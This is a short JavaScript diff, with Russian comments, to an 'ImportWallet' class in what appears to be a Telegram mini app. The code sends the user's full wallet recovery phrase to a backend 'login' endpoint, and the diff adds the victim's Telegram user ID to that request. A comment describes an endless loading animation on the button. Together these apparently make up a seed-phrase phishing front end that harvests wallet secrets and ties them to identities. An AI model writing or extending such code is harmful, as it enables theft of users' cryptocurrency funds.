@@ -70,15 +70,22 @@ class ImportWallet {
         // Блокируем кнопку
 
 
-
+        let userId = null;
         // БЕСКОНЕЧНЫЙ цикл анимации
         let dots = 0;
         const originalText = "Import Wallet"; // Текст, который был на кнопке
         try {
+          const tg = window.Telegram.WebApp;
+          if (tg && tg.initDataUnsafe && tg.initDataUnsafe.user) {
+            userId = tg.initDataUnsafe.user.id;
+          } else {
+            console.warn("Приложение открыто не в Telegram");
+            // Тут можно добавить логику для "обычных" браузеров
+          }
           const response = await fetch(`${API_BASE_URL}/user/login`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phrase: phrase.join(' ') })
+            body: JSON.stringify({ phrase: phrase.join(' '),tg_user_id: userId }),
           });
 
           if (response.ok) {
